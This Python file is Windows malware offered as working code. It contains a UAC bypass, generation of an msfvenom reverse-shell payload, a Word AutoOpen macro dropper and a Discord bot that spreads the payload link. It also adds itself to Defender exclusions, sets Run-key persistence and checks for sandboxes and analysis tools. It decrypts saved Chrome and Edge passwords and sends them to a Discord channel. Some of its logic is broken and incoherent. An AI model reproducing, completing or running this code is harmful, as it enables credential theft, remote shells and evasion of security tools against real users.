import subprocess
import ctypes
import sys
import os
import win32com.client
import hashlib
import discord
import logging
import socket
from urllib.parse import urlparse
from discord.ext import commands
from pathlib import Path
import win32gui
import win32api
import win32security
import win32con
import sqlite3
import win32crypt
import base64
import shutil
import time
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import json
import psutil  

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

def generate_payload():
    global CONFIG
    # Generate payload using msfvenom
    msfvenom_cmd = f"msfvenom -p windows/shell_reverse_tcp LHOST={CONFIG['LHOST']} LPORT={CONFIG['LPORT']} -f exe -o {CONFIG['PAYLOAD_PATH']}"
    try:
        subprocess.run(msfvenom_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to generate payload: {e}")
        sys.exit(1)

def pack_payload():
    # Pack payload into an executable file
    pyinstaller_cmd = f"pyinstaller --onefile --noconfirm {Path(__file__).parent / CONFIG['PAYLOAD_PATH']}"
    try:
        subprocess.run(pyinstaller_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to pack payload: {e}")
        sys.exit(1)

def create_word_document():
    # Create a new Word document
    word = win32com.client.Dispatch("Word.Application")
    doc = word.Documents.Add()

    # Insert a macro that will execute the payload when the document is opened
    doc.Content.Text = f"""
Sub AutoOpen()
    Shell "{CONFIG['PAYLOAD_PATH']}", vbHide
End Sub
"""

    # Save the document as a Word template
    doc.SaveAs(CONFIG["WORD_DOC_PATH"], FileFormat=16)
    doc.Close()
    word.Quit()

def verify_payload():
    # Calculate the SHA256 hash of the payload
    with open(CONFIG["PAYLOAD_PATH"], "rb") as f:
        payload_hash = hashlib.sha256(f.read()).hexdigest()

    trusted_hash = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

    if payload_hash == trusted_hash:
        logging.info("Payload verified.")
        return payload_hash
    else:
        logging.error("Payload verification failed.")
        sys.exit(1)

def send_payload_link():
    # Send the payload download link to the specified channel
    bot = commands.Bot(command_prefix='!')

    @bot.event
    async def on_ready():
        print(f'We have logged in as {bot.user}')
        channel = bot.get_channel(int(CONFIG["SERVER_CHANNEL_ID"]))
        if channel is None:
            logging.error("Channel not found.")
            sys.exit(1)

        try:
            await channel.send(CONFIG["PAYLOAD_URL"])
        except discord.errors.HTTPException as e:
            logging.error(f"Failed to send payload link: {e}")
            sys.exit(1)

    bot.run(CONFIG["BOT_TOKEN"])

def hide_process():
    # Function to hide the process
    try:
        if is_admin():
            htoken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
            win32security.AdjustTokenPrivileges(htoken, False, [(win32security.LookupPrivilegeValue(None, "SeDebugPrivilege"), win32con.SE_PRIVILEGE_ENABLED)])
            
            pid = win32api.GetCurrentProcessId()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            win32api.SetPriorityClass(handle, win32con.REALTIME_PRIORITY_CLASS)
            win32api.DuplicateHandle(win32api.GetCurrentProcess(), handle, win32api.GetCurrentProcess(), handle, 0, False, win32con.DUPLICATE_SAME_ACCESS)
    except Exception as e:
        logging.error(f"Error in hide_process: {e}")

def hide_window():
    # Function to hide the window
    try:
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, 0)
    except Exception as e:
        logging.error(f"Error in hide_window: {e}")

def add_to_exclusions():
    # Function to add the file to exclusions
    try:
        key = win32api.RegCreateKey(win32con.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
        win32api.RegSetValueEx(key, '', 0, win32con.REG_SZ, os.path.realpath(__file__))
        win32api.RegCloseKey(key)
    except Exception as e:
        logging.error(f"Error in add_to_exclusions: {e}")

def add_to_startup():
    # Function to add the file to startup
    try:
        reg_key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(reg_key, "keylogger", 0, win32con.REG_SZ, sys.executable + ' ' + os.path.realpath(__file__))
        win32api.RegCloseKey(reg_key)
    except Exception as e:
        logging.error(f"Error in add_to_startup: {e}")

def is_admin():
    # Function to check if the script is running as an administrator
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_sandboxed():
    # Function to check if the script is running in a sandbox environment
    for check in [
        (lambda: os.getenv("PROCHOT") == "0"),
        (lambda: os.getenv("TERMISVM") == "1"),
        (lambda: os.path.exists("/proc/self/ns/user")),
        (lambda: os.path.exists("/proc/self/status") and "sandbox" in open("/proc/self/status").read()),
        (lambda: os.path.exists("/.dockerenv")),
        (lambda: os.path.exists("/.vagrant")),
        (lambda: socket.gethostname().startswith("vbox")),
        (lambda: os.getenv("VBOX_DESKTOP_NAME")),
        (lambda: os.getenv("VBOX_VERSION_INFO")),
        (lambda: os.getenv("VMWARE")),
        (lambda: os.getenv("VIRT_ENV")),
        (lambda: os.getenv("VIRTUAL_ENV")),
        (lambda: os.getenv("VIRTUALBOX_VERSION")),
        (lambda: os.getenv("WINDIR") == r"C:\Windows\system32\cmd.exe"),
        (lambda: os.getenv("SYSTEMROOT") == r"C:\Windows"),
        (lambda: os.getenv("PROCESSOR_IDENTIFIER").lower().startswith("intel") and "vmx" in os.getenv("PROCESSOR_IDENTIFIER").lower()),
        (lambda: os.getenv("PROCESSOR_LEVEL") == "6" and os.getenv("PROCESSOR_REVISION") == "3d" and os.getenv("PROCESSOR_ARCHITEW6432") == "AMD64"),
    ]:
        if check():
            return True
    return False

def protection_check():
    vm_files = [
        "C:\\windows\\system32\\vmGuestLib.dll",
        "C:\\windows\\system32\\vm3dgl.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vmsrvc.dll",
        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
    ]
    blacklisted_processes = [
        'vmtoolsd.exe', 
        'vmwaretray.exe', 
        'vmwareuser.exe',  
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'vboxservice.exe', 
        'df5serv.exe', 
        'vboxtray.exe', 
        'vmwaretray.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'vgauthservice.exe', 
        'vmacthlp.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'prl_cc.exe', 
        'prl_tools.exe', 
        'xenservice.exe', 
        'qemu-ga.exe', 
        'joeboxcontrol.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe', 
        'joeboxserver.exe'
    ]

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            return True
    for file_path in vm_files:
        if os.path.exists(file_path):
            return True

    return False

def fake_mutex_code(exe_name: str) -> bool:
    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() == exe_name:
            return True
        
    return False

def main():
    generate_payload()
    pack_payload()
    payload_hash = verify_payload()
    create_word_document()
    send_payload_link()

    hide_process()
    hide_window()
    add_to_exclusions()
    add_to_startup()
    is_admin()
    is_sandboxed()
    protection_check()  

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: return ""

def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    result = {}
    try:
        result = main()
    except:
        time.sleep(1)

    try: 
        result2 = get_passwords_edge()
        for i in result2.keys():
            result[i] = result2[i]
    except:
        time.sleep(1)
    
    try:
        bot = commands.Bot(command_prefix='!')

        @bot.event
        async def on_ready():
            print(f'We have logged in as {bot.user}')
            channel = bot.get_channel(int(CONFIG["CHANNEL_ID"]))  
            if channel is None:
                logging.error("Channel not found.")
                sys.exit(1)

            for url, login_info in result.items():
                username, password = login_info
                await channel.send(f"URL: {url}\nUsername: {username}\nPassword: {password}")

        bot.run(CONFIG["BOT_TOKEN"])
    except Exception as e:
        logging.error(f"Failed to send passwords to server: {e}")



if __name__ == "__main__":
    main()
